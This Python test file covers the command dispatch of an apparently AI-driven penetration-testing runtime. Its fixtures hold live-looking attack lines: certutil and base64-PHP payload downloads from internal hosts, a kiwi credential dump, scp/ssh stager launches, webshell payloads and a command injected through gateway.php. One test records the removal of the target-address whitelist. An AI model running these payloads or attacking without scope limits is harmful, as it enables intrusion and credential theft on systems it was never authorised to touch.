"""Lean HTTP and standalone dispatch run offline through the actual client bytes."""
import base64
from contextlib import redirect_stdout
from email.message import Message
import hashlib
import http.client
import io
import json
from pathlib import Path
from types import SimpleNamespace

import pytest

from runtime import lean_http
from runtime.runner import ExecOutcome, observe_marker_frame
from scripts import run_lean_task as cli

from tests.test_lean_task_support import (
    SCOPE, REQUEST, native_client, collected, card, task, cli_args,
    CARD_FOR_CORRECTION, TASK_FOR_CORRECTION,
    _explicit_console_binding, _console_result,
)


def test_no_address_is_ever_scanned_or_whitelisted():
    """**地址白名单整块删掉**（爷爷 2026-10-06："scope 检查完全多余"）。

    旧做法是"正则扫命令里的 IP，再比对冻结端点"，用猜出来的东西否决确定的东西 —— 误伤例：
    `ping -n 8 127.0.0.1`（Windows 上用它当"等八秒"）被判成"打到别的主机"，连吃两次、
    白烧两个回合（walk-66 node 48 实测）。执行位置由绑定的会话决定、目标由图决定，都不需要从
    命令文本里猜。所以：任何地址都原样成命令，不做扫描、不做白名单。
    """
    from runtime import dispatch

    for command in ("ping -n 8 127.0.0.1 >nul & type \\\\192.168.93.40\\C$\\x.txt",
                    "certutil -urlcache -f http://192.168.93.20:2094/agv_session.exe C:\\t.exe",
                    "curl http://10.9.9.9/"):
        argv = dispatch.build({"tool": "cmd", "cmd": command}, marker="mark")
        assert command in argv[-1], command


@pytest.mark.parametrize("action", [
    {"tool": "cmd", "cmd": "echo fixture", "retry_of": "prior-call"},
    {"tool": "shell", "cmd": "echo fixture", "retry_reason": ""},
    {"tool": "shell", "argv": ["echo", "fixture"], "retry_of": "prior-call",
     "retry_reason": "fixture reason"},
    {"tool": "python", "code": "print('fixture')", "retry_of": None},
    {"tool": "code", "code": "print('fixture')", "retry_of": "prior-call",
     "retry_reason": "fixture reason"},
])
def test_a_rerun_declaration_survives_the_flat_translation(action):
    """A declaration the model made has to reach the runtime: every shape keeps it.

    walk-177 node 2: the model filled `retry_of` with a byte-identical call id and the translator
    dropped both control fields, so the runtime answered "already ran" and the step had no legal way
    to re-read after the world changed. The HTTP shape alone kept them, which is why an HTTP
    replay worked while the command shapes could never be repeated.
    """
    request = cli.flat_action(dict(action), SCOPE)["request"]
    for key in ("retry_of", "retry_reason"):
        if key in action:
            assert request.get(key) == action[key], (key, request)


def test_the_position_and_tool_fields_survive_the_flat_translation():
    """`via`（在哪执行）与 `name`（用什么）是模型输出的一部分，翻译时不许丢。

    2026-10-06 walk-67 实测：`flat_action` 构造新请求时把 `via` 丢了，于是"位置核对"
    根本没机会看到它 —— 模型把 via 写成卡 id 也没人拦。
    """
    got = cli.flat_action({"tool": "cmd", "name": "schtasks", "via": "pc1",
                           "cmd": "schtasks /query"})["request"]
    assert got == {"tool": "cmd", "cmd": "schtasks /query", "name": "schtasks", "via": "pc1"}
    prog = cli.flat_action({"tool": "code", "name": "python", "via": "web2",
                            "code": "print(1)"})["request"]
    assert prog["via"] == "web2" and prog["name"] == "python"


def test_a_stray_kind_key_does_not_hide_a_flat_tool_shape():
    """`tool` 与多余的 `kind` 同时出现时，以 `tool` 为准。

    2026-10-06 walk-67 node 14 实测：模型写 `{"tool":"finish","kind":"finish","claim":…}`，
    旧判据在第一行就把整条原样放行，运行时判"形状不认识"，白烧一个回合。
    """
    settled = cli.flat_action({"tool": "finish", "kind": "finish", "claim": "ok",
                               "verdict": "pass", "citations": []})
    assert settled["kind"] == "finish" and settled["claimed_verdict"] == "pass"
    #: 老嵌套形状（只有 kind、没有 tool）仍然原样放行
    nested = {"kind": "call", "request": {"tool": "cmd", "cmd": "id"}}
    assert cli.flat_action(nested) is nested


def test_the_position_decides_the_protocol_not_the_card(tmp_path, monkeypatch):
    """The bound session determines the transport, even when the card claims a different language."""
    from runtime import channels
    from runtime import lean as lean_mod

    card = {"id": "x.y", "digest": "d", "runs_at": "position", "tools": ["msf", "cmd"],
            "speaks": "shell"}
    scope = {"host": "10.0.0.30", "vantage": "position", "resources": "execution_position",
             "carrier": "ch-1", "logical": "pc1"}
    task = {"node_id": "2", "inputs": {"position_speaks": "shell"}}
    binding = _explicit_console_binding("windows")
    sent = []

    def console_call(session, action, timeout):
        assert session == binding
        sent.append(action)
        return _console_result(action)

    monkeypatch.setattr(channels, "console_call", console_call)
    run = lean_mod.LeanRun(tmp_path, card=card, task=task, scope=scope,
                           executor=lambda *args: pytest.fail("base executor used"), session=binding)
    first = run.call({"tool": "cmd", "cmd": "whoami"})
    assert first["read_stop"] == "end_marker"
    assert sent[-1]["operation"] == "shell"
    assert "whoami" in sent[-1]["text"] and "execute -f" not in sent[-1]["text"]
    run.call({"tool": "msf", "name": "kiwi", "cmd": "creds_all"})
    assert sent[-1] == {"operation": "native", "text": "creds_all", "completion": None}


def test_a_command_receipt_records_the_argv_that_was_really_sent(tmp_path, monkeypatch):
    """The receipt records the exact bound operation and payload delivered to the console."""
    from runtime import channels
    from runtime import lean as lean_mod

    card = {"id": "x.y", "digest": "d", "runs_at": "position", "tools": ["cmd"]}
    scope = {"host": "10.0.0.20", "vantage": "position", "resources": "execution_position",
             "carrier": "ch-1", "logical": "web1"}
    sent = []

    def console_call(session, action, timeout):
        sent.append(action)
        return _console_result(action)

    monkeypatch.setattr(channels, "console_call", console_call)
    run = lean_mod.LeanRun(tmp_path, card=card, task={"node_id": "9", "inputs": {}}, scope=scope,
                           executor=lambda *args: pytest.fail("base executor used"),
                           session=_explicit_console_binding("linux"))
    view = run.call({"tool": "cmd", "cmd": "id -u"})
    recorded = json.loads((tmp_path / "calls" / view["call_id"] / "call.json").read_text(encoding="utf-8"))
    assert recorded["argv"] == ["console", sent[0]["operation"], sent[0]["text"]]
    assert view["read_stop"] == "end_marker"


def test_command_categories_bind_to_shell_io_on_meterpreter():
    """Command categories use explicit shell I/O without a native execute-and-unpack round trip."""
    from runtime import dispatch

    for platform, request in (
            ("linux", {"tool": "cmd", "cmd": "id -u"}),
            ("windows", {"tool": "cmd", "cmd": "whoami"}),
            ("windows", {"tool": "pws", "cmd": "Get-Process"})):
        action = dispatch.bind_console(request, _explicit_console_binding(platform), marker="m")
        assert action["operation"] == "shell"
        assert action["completion"] == {"marker": "m"}
        assert "mstart" in action["text"] and "mend" in action["text"]
        assert "execute -f" not in action["text"] and "agv-marker:" not in action["text"]
    with pytest.raises(ValueError, match="LEAN_MSF_NEEDS_METERPRETER_SESSION"):
        dispatch.bind_console({"tool": "msf", "cmd": "sysinfo"},
                              _explicit_console_binding("linux", "shell"), marker="m")


def test_a_flat_command_reaches_a_meterpreter_session_as_a_whole_command(tmp_path, monkeypatch):
    """A native action is sent verbatim; a capture that ran out of time stays unconfirmed.

    An answer that stopped growing on its own is a different thing and does settle the call
    (``read_stop == "quiet"``) -- this fixture's console ran out of time instead.
    """
    from runtime import channels
    from runtime import lean as lean_mod

    card = {"id": "x.y", "digest": "d", "runs_at": "position", "tools": ["msf", "cmd"]}
    scope = {"host": "10.0.0.5", "vantage": "position", "resources": "execution_position",
             "carrier": "ch-1", "logical": "win1"}
    sent = []

    def console_call(session, action, timeout):
        sent.append(action)
        return _console_result(action)

    monkeypatch.setattr(channels, "console_call", console_call)
    run = lean_mod.LeanRun(tmp_path, card=card, task={"node_id": "5", "inputs": {}}, scope=scope,
                           executor=lambda *args: pytest.fail("base executor used"),
                           session=_explicit_console_binding("windows"))
    view = run.call({"tool": "msf", "name": "kiwi", "cmd": "sysinfo"})
    assert sent == [{"operation": "native", "text": "sysinfo", "completion": None}]
    assert view["status"] == "unknown"
    assert view["read_stop"] == "deadline"
    with pytest.raises(ValueError, match="LEAN_UNRESOLVED_CALL"):
        run.call({"tool": "cmd", "cmd": "whoami"})
    assert len(sent) == 1


def test_a_flat_command_is_run_by_the_positions_own_shell(tmp_path):
    """`cmd` 类：整段交给**位置**自己的 shell —— 位置决定套 `/bin/sh -c` 还是 `cmd /c`，
    不由命令文本决定。

    2026-10-06 walk-60 node 14 实测的回归：把整串塞进 `argv[0]`，`shlex.join` 会把它引成一个词，
    于是 `/bin/sh: nmap --unprivileged …: not found (rc 127)` —— 最简单的连通性节点当场停住。
    """
    from runtime import dispatch

    posix = dispatch.build({"tool": "cmd", "cmd": "nmap --unprivileged -sT -p 6379 -oX - 10.0.0.5"},
                           platform="linux", marker="mark")
    assert posix[:2] == ["/bin/sh", "-c"]
    assert "nmap --unprivileged -sT -p 6379 -oX - 10.0.0.5" in posix[2]
    windows = dispatch.build({"tool": "cmd", "cmd": "whoami & hostname"}, platform="windows",
                             marker="mark")
    assert windows[2].startswith("echo markstart") and "whoami & hostname" in windows[2], windows[2]
    #: 内容写歪了要具名拒绝（可回喂），不是停节点
    with pytest.raises(ValueError) as caught:
        dispatch.build({"tool": "cmd", "cmd": "   "}, marker="mark")
    assert "LEAN_COMMAND_MISSING" in str(caught.value)


def test_an_unrecognized_shape_is_fed_back_instead_of_ending_the_node(tmp_path):
    """答复写歪了（不是那四种扁平形状之一）→ 回喂并列出可用形状，不是整节点停。

    2026-10-06 walk-61 node 14/30 实测：命令已经跑成（rc=0），模型回了一个没被翻译的结论形状，
    整节点当场以 `LEAN_ACTION_UNSUPPORTED` 停住 —— 一个形状错误吃掉了已经拿到手的观测。
    """
    from agents._model.contract import ModelReply

    prompts = []

    class Client:
        def available(self):
            return True

        def complete(self, **kwargs):
            prompts.append(kwargs)
            if len(prompts) == 1:
                payload = {"type": "tool_call", "whatever": True}      # 不是四种之一
                return ModelReply(ok=True, text=json.dumps(payload), payload=payload, model="offline")
            action = {"tool": "finish", "claim": "bounded", "verdict": "uncertain", "citations": []}
            return ModelReply(ok=True, text=json.dumps(action), payload=action, model="offline")

    def executor(argv, timeout):
        return ExecOutcome(0, "", "")

    result = cli.drive(card(), task(), SCOPE, executor, client=Client(), run_dir=tmp_path)
    assert result.get("reason") != "LEAN_ACTION_UNSUPPORTED", result
    events = [json.loads(line) for line in
              (tmp_path / "events.jsonl").read_text(encoding="utf-8").splitlines()]
    reasons = [event["refusal"]["reason_code"] for event in events if event.get("kind") == "refusal"]
    assert "LEAN_ACTION_UNSUPPORTED" in reasons, reasons
    note = [event["refusal"]["note"] for event in events
            if event.get("kind") == "refusal"
            and event["refusal"]["reason_code"] == "LEAN_ACTION_UNSUPPORTED"][0]
    assert '"tool":"cmd"' in note and '"tool":"finish"' in note, "拒绝语要列出可用形状"


def test_the_five_classes_are_what_the_model_is_asked_for():
    """爷爷 2026-10-06 口径：输出就是"用什么 + 参数"，五类，别的一律没有。

    * `cmd`  —— 一条命令行（套 cmd /c 还是 /bin/sh -c 由**位置**决定，不由命令文本决定）；
    * `msf`  —— meterpreter 动词；`pws` —— PowerShell；`tool` —— 具名工具 + 参数；
    * `code` —— 一整段程序（完整 poc 就装在这里）。
    `tool`/`pws`/`code`/`msf` 都原样交给运行时 —— 不再逐个手写分支（那样漏一个就死一个节点）。
    """
    #: 老名字 `shell` 映射到 `cmd`（迁移期兼容；老卡与离线固定装置照旧能跑）
    shell = cli.flat_action({"tool": "shell", "cmd": "curl -sS http://10.0.0.5:8080/"})
    assert shell == {"kind": "call",
                     "request": {"tool": "cmd", "cmd": "curl -sS http://10.0.0.5:8080/"}}
    #: 老 argv 形状 → `tool` 类（名字 + 参数数组），语义一致
    argv = cli.flat_action({"tool": "shell", "argv": ["nmap", "-p", "6379", "10.0.0.5"]})
    assert argv["request"] == {"tool": "tool", "name": "nmap", "args": ["-p", "6379", "10.0.0.5"]}
    #: 五类原样放行
    for shape in ({"tool": "msf", "cmd": "creds_all"},
                  {"tool": "pws", "cmd": "Get-Process"},
                  {"tool": "tool", "name": "nmap", "args": ["-p", "80", "10.0.0.5"]},
                  {"tool": "code", "lang": "python", "code": "print(1)"}):
        assert cli.flat_action(shape)["request"] == shape, shape
    #: 结构化 http 原样（引擎自带客户端；不再翻译 curl 行，也不再比主机名）
    structured = cli.flat_action({"tool": "http", "method": "GET", "path": "/x?y=1",
                                  "headers": {}, "body": ""})
    assert structured["request"]["path"] == "/x?y=1"
    #: 提示词里必须写的是这五类
    assert '{"tool":"cmd"' in cli.SYSTEM and '{"tool":"msf"' in cli.SYSTEM
    assert '{"tool":"tool","name"' in cli.SYSTEM and '{"tool":"code"' in cli.SYSTEM
    #: http 只收结构化字段（引擎自带客户端，不需要目标上有 curl）
    assert '{"tool":"http","method":"GET"' in cli.SYSTEM
    #: **工具面全覆盖**：卡片声明的任何工具都能用扁平形状写（stage 是最常撞的那个）。
    #: 三次同类事故（http 被写成 curl / finish 没翻译 / stage 没翻译）逼出来的通用分支。
    staged = cli.flat_action({"tool": "stage"})
    assert staged == {"kind": "call", "request": {"tool": "stage"}}
    override = cli.flat_action({"tool": "stage", "payload": "<?php ?>", "cookie": "PHPSESSID=x"})
    assert override["request"] == {"tool": "stage", "payload": "<?php ?>", "cookie": "PHPSESSID=x"}
    other = cli.flat_action({"tool": "winrm", "cmd": "whoami"})
    assert other == {"kind": "call", "request": {"tool": "winrm", "cmd": "whoami"}}, other
    assert cli.flat_action({"tool": "abandon", "call_id": "c1", "reason": "unusable"}) == {
        "kind": "abandon", "call_id": "c1", "reason": "unusable"}
    program = cli.flat_action({"tool": "python", "code": "print(1)"})
    assert program["request"] == {"tool": "code", "lang": "python", "code": "print(1)"}
    #: finish 与旧嵌套形状原样放行：脚本化执行器、离线用例与历史记录都靠它们
    finish = {"kind": "finish", "claim": "c", "claimed_verdict": "uncertain", "citations": []}
    assert cli.flat_action(finish) is finish
    #: 扁平的 finish 必须也被翻译（walk-61 node 14/30：命令跑成了，结论这一步没被翻译 → 节点停）
    flat_finish = cli.flat_action({"tool": "finish", "claim": "端口开着",
                                   "verdict": "pass", "citations": [{"call_id": "c1"}],
                                   "type": "tool_call"})
    assert flat_finish["kind"] == "finish"
    assert flat_finish["claimed_verdict"] == "pass"
    assert flat_finish["citations"] == [{"call_id": "c1"}]
    assert "type" not in flat_finish, "多余字段要丢掉，别让运行时判成形状不认识"
    nested = {"kind": "call", "request": {"tool": "shell", "argv": ["id"]}}
    assert cli.flat_action(nested) is nested
    #: 提示词里必须写的是新契约（五类 + 四段），模型照它回话
    assert '{"tool":"cmd"' in cli.SYSTEM
    assert '"kind":"call"' not in cli.SYSTEM


def test_hand_setting_a_transport_owned_header_is_a_shape_refusal_not_a_death():
    """模型想自己设 `Host` 头（或 Content-Length 之类）时，是"这一问写歪了"，不是目标结果。

    2026-10-06 walk-59 node 7 实测：整步还没发出去一个请求，就被 `LEAN_HTTP_HEADER_FORBIDDEN: Host`
    当成致命错误停住（walk.txt 的"调用：无"）。它必须在可回喂清单里，并告诉模型去掉那个头。
    """
    assert "LEAN_HTTP_HEADER_FORBIDDEN" in cli.REFUSABLE
    note = cli.refusal_record("LEAN_HTTP_HEADER_FORBIDDEN", "LEAN_HTTP_HEADER_FORBIDDEN: Host",
                              card(), SCOPE)["note"]
    #: the feedback now phrases it as "remove the forbidden header before resubmitting"
    assert "Host" in note and "forbidden header" in note


def test_tool_and_code_bind_to_shell_io_on_meterpreter():
    """Tool and code categories share explicit shell binding without an invented native command."""
    from runtime import dispatch

    linux_tool = dispatch.bind_console(
        {"tool": "tool", "name": "nmap", "args": ["-sT", "-p", "6379", "192.0.2.9"]},
        _explicit_console_binding("linux"), marker="m")
    windows_code = dispatch.bind_console(
        {"tool": "code", "name": "python", "code": "print(1)"},
        _explicit_console_binding("windows"), marker="m")
    for action in (linux_tool, windows_code):
        assert action["operation"] == "shell"
        assert action["completion"] == {"marker": "m"}
        assert "execute -f" not in action["text"]
    assert "nmap" in linux_tool["text"]
    assert "python" in windows_code["text"]
    plain = dispatch.build({"tool": "tool", "name": "nmap", "args": ["-sT", "192.0.2.9"]},
                           platform="linux", marker="m")
    assert plain[:2] == ["/bin/sh", "-c"], plain


def test_a_big_request_body_is_staged_as_a_file_on_the_position(monkeypatch):
    """A body too big for one console line is written there, then read back by the client.

    Measured 2026-10-08: 4214 bytes over a 4096-byte line was refused, and an over-long line
    is truncated mid-command, so the body travels as a file instead of as an argument.
    """
    from runtime import channels
    from runtime.lean import LeanRun
    from runtime.runner import ExecOutcome

    sent = []

    def console_call(binding, action, timeout):
        marker = action["completion"]["marker"]
        sent.append(action["text"])
        return ExecOutcome(returncode=0, read_stop="end_marker",
                           stdout=marker + "start\n\n" + marker + "end 0\n")

    monkeypatch.setattr(channels, "console_call", console_call)
    run = LeanRun.__new__(LeanRun)
    run.session = {"session_type": "meterpreter", "platform": "linux",
                   "capacity": {"max_bytes": 1024, "source": "fixture"}}
    run.timeout = 5.0
    import base64

    payload = base64.b64encode(json.dumps(
        {"tool": "http", "method": "POST", "path": "/x", "headers": {},
         "body": "y" * 3000}).encode("utf-8")).decode("ascii")
    text = run._stage_body(["python3", "-c", "print(1)", payload], "agvdeadbeef")
    assert len(sent) >= 3, "the body has to travel in bounded pieces"
    assert all(len(piece.encode("utf-8")) <= 1024 for piece in sent)
    assert all("printf" in piece for piece in sent)
    assert "> /tmp/agv-http-agvdeadbeef.b64" in sent[0], "the first piece creates it"
    assert ">> /tmp/agv-http-agvdeadbeef.b64" in sent[1], "the rest append"
    assert all(("agvdeadbeefw%dstart" % index) in piece for index, piece in enumerate(sent)), \
        "every piece prints the marker it is confirmed by"
    assert 'python3 -c \'print(1)\' "$(cat /tmp/agv-http-agvdeadbeef.b64)"' in text
    assert text.rstrip().endswith("rm -f /tmp/agv-http-agvdeadbeef.b64")


def test_a_node_with_something_to_hand_over_plants_that():
    """The card's fixed stage step plants the run's hand-over, not the card's plain shell."""
    from runtime.lean import stage_payload_for

    card = {"id": "method.fixture", "kind": "method",
            "stage": {"path": "/upload", "payload": "<?php echo 'PLAIN'; ?>"}}
    task = {"node_id": "7", "inputs": {"delivery_payload": "<?php echo 'HANDOVER'; ?>"}}
    assert stage_payload_for(card, task, {"tool": "stage"}) == "<?php echo 'HANDOVER'; ?>"
    assert stage_payload_for(card, task, {"tool": "stage", "payload": "mine"}) == ""
    assert stage_payload_for(card, {"inputs": {}}, {"tool": "stage"}) == ""
    assert stage_payload_for({"id": "method.x"}, task, {"tool": "stage"}) == ""


def test_a_declared_handover_must_be_run_before_the_step_concludes(tmp_path):
    """The key write is not the hand-over: the stager line is.

    walk-135 node 12: the model wrote the ssh key, concluded, and the run waited for a callback
    nobody had asked for -- the node failed with a working exploit chain behind it.
    """
    from runtime import lean as lean_mod

    card = {"id": "x.y", "digest": "d", "runs_at": "position", "tools": ["cmd"]}
    task = {"node_id": "12", "inputs": {
        "delivery_command": ("scp /tmp/agv-materials/agv_a9ca97c48d.bin root@web1:/tmp/agv_a9ca97c48d"
                             " && ssh root@web1 'nohup /tmp/agv_a9ca97c48d &'"),
        "delivery_remote_stager": "/tmp/agv_a9ca97c48d"}}
    scope = {"host": "10.0.0.5", "vantage": "position", "logical": "web1",
             "resources": "execution_position", "carrier": "ch-1"}
    run = lean_mod.LeanRun(tmp_path, card=card, task=task, scope=scope,
                           executor=lambda *args: pytest.fail("base executor used"),
                           session=_explicit_console_binding("linux"))
    key = "call-20261008T084512-abcdef-" + "a" * 32
    assert run.delivery_needles() == [[task["inputs"]["delivery_command"], "agv_a9ca97c48d.bin"]]
    run._read = lambda: []
    assert run.delivery_pending() is True
    run._read = lambda: [{"kind": "intent", "call_id": key, "request": {
        "tool": "cmd", "cmd": "scp /tmp/agv-materials/agv_a9ca97c48d.bin root@web1:/tmp/agv_a9ca97c48d"}}]
    assert run.delivery_pending() is False
    run._read = lambda: [{"kind": "intent", "call_id": key, "request": {
        "tool": "cmd", "cmd": "cat /tmp/agv-materials/agv_a9ca97c48d.key.pub | redis-cli -x set k"}}]
    assert run.delivery_pending() is True
    quiet = lean_mod.LeanRun(tmp_path / "quiet", card=card, task={"node_id": "14", "inputs": {}},
                             scope=scope,
                             executor=lambda *args: pytest.fail("base executor used"),
                             session=_explicit_console_binding("linux"))
    assert quiet.delivery_pending() is False


def test_planting_without_triggering_is_not_a_hand_over(tmp_path):
    """Half a hand-over is not a hand-over, and the gate has to say so.

    walk-175 node 7: the model planted the payload, verified the login, and then concluded as
    "unsatisfied" - the upload and the include were never sent. The plant command alone had been
    made enough to silence the gate, so the step was allowed to end with no session and every
    later node waiting on its product was blocked.
    """
    from runtime import lean as lean_mod

    card = {"id": "x.y", "digest": "d", "runs_at": "position", "tools": ["cmd", "http"]}
    task = {"node_id": "7", "inputs": {
        "delivery_command": "echo AGV_DELIVERY_TRIGGER",
        "delivery_plant_command": "printf %s QUJD | base64 -d > /tmp/agv.png",
        "delivery_plant_path": "/tmp/agv.png",
        "delivery_remote_stager": "C:\\Windows\\Temp\\agv_deadbeef.exe"}}
    scope = {"host": "10.0.0.5", "vantage": "position", "logical": "web1",
             "resources": "execution_position", "carrier": "ch-1"}
    run = lean_mod.LeanRun(tmp_path, card=card, task=task, scope=scope,
                           executor=lambda *args: pytest.fail("base executor used"),
                           session=_explicit_console_binding("linux"))
    key = "call-20261008T135645-9002bf-" + "c" * 32
    trigger_key = "call-20261008T135655-9002c1-" + "d" * 32
    run._read = lambda: [{"kind": "intent", "call_id": key, "request": {
        "tool": "cmd", "cmd": task["inputs"]["delivery_plant_command"]}}]
    assert run.delivery_pending() is True, "planting it is only half of it"
    run._read = lambda: [
        {"kind": "intent", "call_id": key, "request": {
            "tool": "cmd", "cmd": task["inputs"]["delivery_plant_command"]}},
        {"kind": "intent", "call_id": trigger_key, "request": {
            "tool": "http", "method": "GET",
            "path": "/ispirit/interface/gateway.php?json=%7B%7D&cmd=echo AGV_DELIVERY_TRIGGER"}}]
    assert run.delivery_pending() is False


def test_a_base64_handover_counts_as_run_when_the_run_copies_it(tmp_path):
    """A plant command that hides the stager's name behind base64 is still the hand-over.

    walk-172 node 19: the engine handed over `printf %s <base64> | base64 -d > /tmp/agv.png`,
    the model sent exactly those 529 characters, and the gate -- looking only for the stager's
    file name, which base64 encoding means never appears in the clear -- refused three times
    as `LEAN_DELIVERY_NOT_ISSUED` and threw away a step whose chain had already run.
    """
    from runtime import lean as lean_mod

    plant = ("printf %s PD9waHAgJHU9J2h0dHA6Ly8xMC4wLjAuOToxMDg2L2Fndi5iaW4nO2VjaG8gJ0w1Jzs="
             " | base64 -d > /tmp/agv.png")
    card = {"id": "x.y", "digest": "d", "runs_at": "position", "tools": ["cmd"]}
    task = {"node_id": "19", "inputs": {
        "delivery_command": "echo AGV_DELIVERY_TRIGGER",
        "delivery_plant_command": plant,
        "delivery_plant_path": "/tmp/agv.png",
        "delivery_remote_stager": "C:\\Windows\\Temp\\agv_b697e803d5.exe"}}
    scope = {"host": "10.0.0.5", "vantage": "position", "logical": "web2",
             "resources": "execution_position", "carrier": "ch-1"}
    run = lean_mod.LeanRun(tmp_path, card=card, task=task, scope=scope,
                           executor=lambda *args: pytest.fail("base executor used"),
                           session=_explicit_console_binding("linux"))
    key = "call-20261008T133402-559b1d-" + "b" * 32
    trigger_key = "call-20261008T133414-559b1f-" + "c" * 32
    assert run.delivery_needles() == [[plant], ["echo AGV_DELIVERY_TRIGGER", "agv_b697e803d5.exe"]]
    run._read = lambda: []
    assert run.delivery_pending() is True
    run._read = lambda: [{"kind": "intent", "call_id": key, "request": {
        "tool": "cmd", "cmd": "ls -l /tmp/agv.png"}}]
    assert run.delivery_pending() is True, "reading the plain path back is not planting it"
    run._read = lambda: [{"kind": "intent", "call_id": key, "request": {
        "tool": "cmd", "cmd": plant}}]
    assert run.delivery_pending() is True, "the planting is only the half the run hands over first"
    run._read = lambda: [
        {"kind": "intent", "call_id": key, "request": {"tool": "cmd", "cmd": plant}},
        {"kind": "intent", "call_id": trigger_key, "request": {
            "tool": "http", "method": "GET",
            "path": "/ispirit/interface/gateway.php?json=%7B%7D&cmd=echo%20AGV_DELIVERY_TRIGGER"}}]
    assert run.delivery_pending() is False


def test_an_entry_position_refuses_the_engines_own_http_client(tmp_path):
    """`http`/`stage` are sent from the control end; an entry position takes one command line instead."""
    from runtime import lean

    card = {"id": "method.fixture", "kind": "method", "runs_at": "position",
            "inputs": {}, "tools": ["http", "cmd"], "body": "x", "digest": "d"}
    task = {"node_id": "19", "goal": "g", "inputs": {"position_platform": "linux"}}
    scope = {"host": "192.0.2.7", "vantage": "position", "resources": "execution_position",
             "carrier": "web-root", "logical": "web2"}
    binding = {"channel_id": "web-root", "kind": "console_session", "session_type": "entry",
               "position_kind": "web", "host": "192.0.2.7", "logical": "web2",
               "platform": "linux", "lifecycle": "registered",
               "observation": {"state": "alive"}, "recipe": {"kind": "asset_command"}}
    run = lean.LeanRun(tmp_path, card=card, task=task, scope=scope,
                       executor=lambda argv, timeout: None, session=binding)
    with pytest.raises(ValueError, match="LEAN_ENTRY_POSITION_COMMAND_ONLY"):
        run.call({"tool": "http", "method": "GET", "path": "/x"})


def test_an_entry_position_refusal_is_handed_back_not_fatal():
    """`http`/`stage` on an entry position is "this deployment does not offer that here"."""
    import run_lean_task

    assert "LEAN_ENTRY_POSITION_COMMAND_ONLY" in run_lean_task.REFUSABLE
